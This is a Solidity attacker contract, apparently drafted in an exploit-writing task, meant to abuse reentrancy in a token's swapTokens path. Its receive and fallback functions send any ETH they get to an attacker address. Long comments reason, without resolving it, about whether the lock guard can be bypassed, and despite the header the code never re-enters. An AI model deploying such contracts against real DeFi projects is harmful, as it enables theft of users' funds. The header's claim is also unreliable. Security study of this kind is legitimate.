// Malicious contract that receives ETH and re-enters
contract MaliciousReceiver {
    address public target;
    address public attacker;
    uint256 public reentrancyCount = 0;
    uint256 public maxReentrancy = 3;  // Limit to avoid out of gas

    function initialize(address _target, address _attacker) external {
        target = _target;
        attacker = _attacker;
    }

    receive() external payable {
        reentrancyCount++;

        if (reentrancyCount < maxReentrancy) {
            // Re-enter the swapTokens function by triggering another swap
            // We need to call a function that will trigger swapTokens
            // The easiest is to transfer some tokens to the pair to trigger fee accumulation
            // But we need to be careful not to cause infinite recursion

            // Instead, we can try to trigger the swap again by interacting with the contract
            // However, the inSwapAndLiquify flag should prevent reentrancy
            // Wait - the vulnerability is that we're still inside the lockTheSwap modifier!
            // The inSwapAndLiquify is still true, so we shouldn't be able to re-enter swapTokens

            // Actually, looking at the code again: the swapTokens function has the lockTheSwap modifier
            // which sets inSwapAndLiquify = true at the start and sets it to false at the end
            // So if we're in the receive function, we're still inside the modifier execution
            // and inSwapAndLiquify should still be true

            // The issue might be that we can call other functions that don't check inSwapAndLiquify
            // Let me check the _transfer function...

            // Actually, I need to re-examine. The hint says the vulnerability is in transferToAddressETH
            // which is called INSIDE swapTokens. So when we receive ETH here, we're still inside
            // swapTokens, and inSwapAndLiquify is still true.

            // The key insight: we need to find a way to exploit this. Let me think...
            // We could try to call swapTokens again? No, it checks !inSwapAndLiquify.

            // Wait! I see it now. Look at the swapTokens function:
            // 1. It swaps tokens for ETH (adds ETH to contract)
            // 2. It calculates transferredBalance = address(this).balance.sub(initialBalance)
            // 3. It calls transferToAddressETH(marketingAddress, transferredBalance.mul(marketingDivisor).div(100))

            // If we re-enter during the transfer and somehow cause another swap,
            // the transferredBalance calculation would be wrong!

            // But we can't call swapTokens directly because of the inSwapAndLiquify check.
            // However, we might be able to trigger it indirectly through _transfer?

            // Actually, let me check: the _transfer function has:
            // if (!inSwapAndLiquify && swapAndLiquifyEnabled && balanceOf(uniswapV2Pair) > 0) {
            // So it won't trigger swapTokens if inSwapAndLiquify is true.

            // Hmm, maybe the exploit is different. Let me re-read the hint...
            // "When the contract calls transferToAddressETH(marketingAddress, ...), if marketingAddress is a malicious contract, it can re-enter the swap function via its fallback function before the inSwapAndLiquify flag is reset."

            // But swapTokens has the lockTheSwap modifier which should prevent reentrancy!
            // Unless... the modifier doesn't work correctly?

            // Actually, I think I misunderstood. Let me trace through:
            // 1. swapTokens is called with lockTheSwap
            // 2. inSwapAndLiquify = true
            // 3. swapTokensForEth is called
            // 4. transferToAddressETH is called
            // 5. recipient.transfer(amount) triggers our receive function
            // 6. We're still in swapTokens, inSwapAndLiquify is still true
            // 7. We can't re-enter swapTokens because of the check

            // Unless... we can call a function that bypasses the check?
            // Or maybe the issue is with buyBackTokens which also has lockTheSwap?

            // Actually, I think the real vulnerability might be that we can cause multiple transfers
            // by manipulating the contract's ETH balance during the transfer.

            // For now, let's implement a simple reentrancy to see what happens
            // We'll just forward the ETH to the attacker
            payable(attacker).transfer(address(this).balance);
        } else {
            // Forward any remaining ETH
            payable(attacker).transfer(address(this).balance);
        }
    }

    // Fallback function for safety
    fallback() external payable {
        payable(attacker).transfer(address(this).balance);
    }
}

